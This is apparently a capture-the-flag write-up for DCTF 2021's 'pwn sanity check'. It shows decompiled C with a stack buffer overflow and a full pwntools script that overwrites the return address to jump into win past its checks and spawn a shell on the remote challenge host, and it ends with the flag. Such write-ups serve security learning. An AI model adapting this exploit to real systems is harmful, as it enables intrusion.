Preface  
-------

We get a simple binary, with simple input and output.

Overview  
--------

Looking at the binary in *ghidra*, I found these functions.

```C  
void vuln(void)  
{  
 char local_48 [60];  
 int local_c;  
  
 puts("tell me a joke");  
 fgets(local_48,0x100,stdin);  
 if (local_c == -0x21523f22) {  
   puts("very good, here is a shell for you. ");  
   shell();  
 }  
 else {  
   puts("will this work?");  
 }  
 return;  
}

void shell(void)  
{  
 puts("spawning /bin/sh process");  
 puts("wush!");  
 printf("$> ");  
 puts("If this is not good enough, you will just have to try harder :)");  
 return;  
}

void win(int param_1,int param_2)  
{  
 puts("you made it to win land, no free handouts this time, try harder");  
 if (param_1 == -0x21524111) {  
   puts("one down, one to go!");  
   if (param_2 == 0x1337c0de) {  
     puts("2/2 bro good job");  
     system("/bin/sh");  
                   /* WARNING: Subroutine does not return */  
     exit(0);  
   }  
 }  
 return;  
}  
```

From looking at these functions I knew, setting the variable isn't the correct
way, because it wasn't a real shell.

But I can jump to win, for a long time I tried to ret2win with all the
parameters set. But then I realized, I could just skip the checks.  
Because if I jump to the offset of win, where the calls where over, I could
just ignore the setting of any parameters and get the shell.

My final exploit script was:

```Python  
#!/usr/bin/env python3  
from pwn import *

context.arch = 'amd64'  
#context.log_level = "DEBUG"  
context.log_level = "INFO"

context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

vulnerable = './pwn_sanity_check'  
elf = ELF(vulnerable)

#p = process( vulnerable )  
p = remote("dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io", 7480)

p.readuntil('tell me a joke')

ret_offset = 72  
# 60 for buffer 4 for integer and 8 for RBP

win_function = elf.symbols['win']  
win_function_shell = win_function + 0x44 # Skipping all parameter checks

p.sendline(b'\x41'*(ret_offset) + p64(win_function_shell))

p.readuntil('will this work')  
p.read( 2048, timeout=1 ) # cleanup output  
p.interactive()  
```

The complete flag was:  
```dctf{Ju5t_m0v3_0n}```

Original writeup (https://w0y.at/writeup/2021/05/17/dctf-2021-pwn-sanity-
check.html).